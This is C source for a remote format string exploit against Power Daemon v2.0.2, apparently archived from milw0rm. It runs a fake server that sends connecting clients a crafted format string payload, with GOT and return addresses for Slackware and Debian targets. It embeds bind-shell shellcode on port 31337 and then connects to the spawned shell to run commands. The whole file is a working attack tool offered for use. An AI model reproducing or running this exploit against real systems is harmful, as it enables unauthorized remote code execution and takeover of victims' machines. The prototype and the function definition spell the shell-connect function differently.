/*
 * gexp-powerd.c
 *
 * Power Daemon v2.0.2 Remote Format String Exploit
 * Copyright (C) 2005 Gotfault Security
 *
 * Bug found and developed by: barros and xgc
 *
 * Original Reference:
 * http://gotfault.net/research/exploit/gexp-powerd.c
 *
 */

#include <getopt.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdio.h>

/*==[ Prototypes ]==*/
void fatal(char *);
void Usage(char *);
void FakeServer(char *,int);
void ExecuteShell(int);
int  CreateEvilBuffer(int,int,int,int,char *);
int  ConnectToShell(char *,int);

/*==[ Defines ]==*/
#define	DEFAULT_PORT		532	// Default fake server port
#define BIND_PORT		31337	// Default port to bind
#define NOPSIZE			50	// Number of NOP
#define NOP			0x90	// NOP byte
#define PAD			""	// Format string alignment
#define PORT_OFFSET		29	// Offset to fix the shellcode
#define STDIN			0
#define STDOUT			1

/*==[ Targets ]==*/
struct
{
	char	*Name;
	int	Gotaddr;
	int	Retaddr;
	int	Pop;
}Targets[] =
	{
		"Power Daemon v2.0.2 @ Slackware 10.0",
		0x0804c180,
		0xbffff2d4,
		17,

                "Power Daemon v2.0.2 @ Debian 3.1 Linux",
                0x0804c198,
                0xbffff16c,
                27,

		// Finish
		0,
		0,
		0,
		0
	};

/*==[ Shellcode by Marco Ivaldi <raptor@0xdeadbeef.info> ]==*/
char shellcode[] =
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
        "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
        "\x89\xc7\x52\x66\x68"
        "BP" // Port to bind
        "\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80"
        "\xb0\x66\xb3\x04\xcd\x80"
        "\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80"
        "\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
        "\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
	extern  char		*optarg;
	extern  int		optind;
		char		opt;
		char		*Host = NULL;
		int		Port = DEFAULT_PORT;
		int		BindPort = BIND_PORT;
		int		TargetNumber = -1;
		int		Sock,i;
		char		EvilBuffer[1024];
		int		BufLen;

	fprintf(stdout,"\n--=[ Power Daemon Remote Format String Exploit ]\n\n");
	
	// Process arguments
	while ( (opt = getopt(argc,argv,"t:p:r:")) != EOF)
	{
		switch(opt)
		{
			case 'r':
				BindPort = atoi(optarg);
				if(!BindPort) Usage(argv[0]);
			break;
			case 'p':
				Port = atoi(optarg);
				if(!Port) Usage(argv[0]);
			break;
			case 't':
				TargetNumber = atoi(optarg);
			break;
			default: Usage(argv[0]);
			break;
		}
	}

	// Verify target
	for(i=0;;i++)
		if(Targets[i].Name == 0) break;
	if(TargetNumber == -1) Usage(argv[0]);

	fprintf(stdout,"[*] Plataform             : %s\n",Targets[TargetNumber].Name);
        fprintf(stdout,"[*] Target GOT            : %#010x\n",Targets[TargetNumber].Gotaddr);
        fprintf(stdout,"[*] Target Retaddr        : %#010x\n",Targets[TargetNumber].Retaddr);
        fprintf(stdout,"[*] Bind to port          : %u\n",BindPort);
        fprintf(stdout,"[*] Target POP            : %d\n\n",Targets[TargetNumber].Pop);

	CreateEvilBuffer(Targets[TargetNumber].Gotaddr,Targets[TargetNumber].Retaddr,Targets[TargetNumber].Pop,BindPort,EvilBuffer);
	FakeServer(EvilBuffer, BindPort);
}

void FakeServer(char *EvilBuffer, int BindPort) {

	int sock, newsock, i, reuseaddr = 1;
	struct sockaddr_in remoteaddr;
	struct sockaddr_in localaddr;
	int addrlen = sizeof(struct sockaddr_in);
	struct hostent *he;

	localaddr.sin_family = AF_INET;
	localaddr.sin_port = htons(DEFAULT_PORT);
	localaddr.sin_addr.s_addr = INADDR_ANY;
	bzero(&(localaddr.sin_zero), 8);

	fprintf(stdout,"[*] Creating Fake Server  : ");

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror(" socket()");
		printf("\n");
		exit(1);
	}

	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuseaddr,
		(socklen_t)sizeof(reuseaddr)) < 0) {
		perror(" setsockopt()");
		printf("\n");
		exit(1);
	}

	if (bind(sock, (struct sockaddr *)&localaddr, sizeof(localaddr)) < 0) {
		perror(" bind()");
		printf("\n");
		exit(1);
	}

	if (listen(sock, 1) < 0) {
		perror(" listen()");
		printf("\n");
		exit(1);
	}
	
	fprintf(stdout, "done\n");

	printf("[*] Waiting Client        : ");
	fflush(stdout);

	if ((newsock = accept(sock, (struct sockaddr *)&remoteaddr, &addrlen)) < 0) {
		perror(" accept()");
		printf("\n");
		exit(1);
	}

	if (getpeername(newsock, (struct sockaddr *)&remoteaddr, &addrlen) < 0) {
		perror(" getpeername()");
		printf("\n");
		exit(1);
	}

	fprintf(stdout, "done\n");

	fprintf(stdout, "[*] Host Connected        : %s:%u\n", inet_ntoa(remoteaddr.sin_addr), ntohs(remoteaddr.sin_port));

	fprintf(stdout, "[*] Sending EvilBuffer    : ");
	if(send(newsock,EvilBuffer,strlen(EvilBuffer)+1,0) == -1) {
		fatal("send()");
	}

	fprintf(stdout, "done\n\n");

	memset(EvilBuffer, 0x00, sizeof(EvilBuffer));
	strcpy(EvilBuffer, (char *)inet_ntoa(remoteaddr.sin_addr));
	
        close(newsock);

        sleep(1);

        newsock = ConectToShell(EvilBuffer,BindPort);

        if(newsock == -1) {
                fprintf(stdout,"[*] Exploit Failed.\n\n");
                exit(0);
        }
        else {
                fprintf(stdout,"[*] Spawning Shell...\n\n");
                ExecuteShell(newsock);
                close(newsock);
        }

	fflush(stdout);
}

int CreateEvilBuffer(int GOT, int RETADDR, int POP, int BINDTOPORT, char *buffer)
{
        char            *nops = malloc(NOPSIZE+1);
        char            *ptr; 
        unsigned short  *len;
        unsigned short  *portPtr = (unsigned short *)(shellcode+PORT_OFFSET);

        // Fix shellcode
        *portPtr = htons(BINDTOPORT);

        ptr = buffer;

        // Create Nops
        bzero(nops,NOPSIZE+1);
        memset(nops,NOP,NOPSIZE);

	fprintf(stdout, "[*] Creating EvilBuffer   : ");

        // Create format string attack
        sprintf(ptr,"WHATIDO "
                PAD
                "%c%c%c%c"
                "%c%c%c%c"
                "%%.%dd"
                "%%%d$hn"
                "%%.%dd"
                "%%%d$hn"
                "%s%s",
                ((u_long)GOT),
                ((u_long)GOT >> 8),
                ((u_long)GOT >> 16),
                ((u_long)GOT >> 24),
                ((u_long)GOT+2),
                (((u_long)GOT+2) >> 8),
                (((u_long)GOT+2) >> 16),
                (((u_long)GOT+2) >> 24),
                ((RETADDR & 0x0000FFFF) - 26),
                POP,
                (((RETADDR & 0xFFFF0000)>>16) + 0x10000 - (RETADDR & 0x0000FFFF)),
                POP+1,nops,shellcode);
	fprintf(stdout, "done\n");
	fflush(stdout);

        return (strlen(ptr));
}

int ConectToShell(char *Host,int Port)
{
        struct          sockaddr_in server;
        struct          hostent *hp;
        int             s;

        server.sin_family = AF_INET;
        hp = gethostbyname(Host);
        if(!hp) return(-1);

        memcpy(&server.sin_addr,hp->h_addr,hp->h_length);
        server.sin_port = htons(Port);

        s = socket(PF_INET,SOCK_STREAM,0);
        if(connect(s,(struct sockaddr *)&server, sizeof(server)) < 0)
                return(-1);

        return(s);
}

void ExecuteShell(int Sock)
{
        char            buffer[1024 * 10];
        int             count;
        fd_set          readfs;

        write(Sock,"uname -a;id\n",12);
        while(1)
        {
                FD_ZERO(&readfs);
                FD_SET(STDIN, &readfs);
                FD_SET(Sock, &readfs);
                if(select(Sock + 1, &readfs, NULL, NULL, NULL) > 0)
                {
                        if(FD_ISSET(STDIN, &readfs))
                        {
                                if((count = read(STDIN, buffer, 1024)) <= 0)
                                {
                                        if(errno == EWOULDBLOCK || errno == EAGAIN)
                                                continue;
                                        else
                                        {
                                                close(Sock);
                                                exit(-1);
                                        }
                                }
                                write(Sock, buffer, count);
                        }
                        if(FD_ISSET(Sock, &readfs))
                        {
                                if((count = read(Sock, buffer, 1024)) <= 0)
                                {
                                        if(errno == EWOULDBLOCK || errno == EAGAIN)
                                                continue;
                                        else
                                        {
                                                close(Sock);
                                                exit(-1);
                                        }
                                }
                                write(STDOUT, buffer, count);
                        }
                }
	}
}

void fatal(char *ErrorMsg)
{
        fprintf(stderr,"ERROR - %s\n\n",ErrorMsg);
        exit(1);
}


void Usage(char *Prog)
{
        int i;
        fprintf(stderr, "Usage: %s <options>\n\n"
                        "Options:\n\n"
                        " -t target     : Select the target\n"
			" -p portnumber : Sets a new port number <default: %d>\n"
                        " -r bindport   : Sets the port to bind a shell <default: %d>\n\n"
                        "Targets:\n\n",Prog,DEFAULT_PORT,BIND_PORT);

        for(i=0;;i++)
        {
                if(Targets[i].Name != 0)
                        fprintf(stderr," [%u] %s\n",i,Targets[i].Name);
                else
                        break;
        }
        fprintf(stderr,"\n");
        exit(1);
}

// milw0rm.com [2006-02-10]

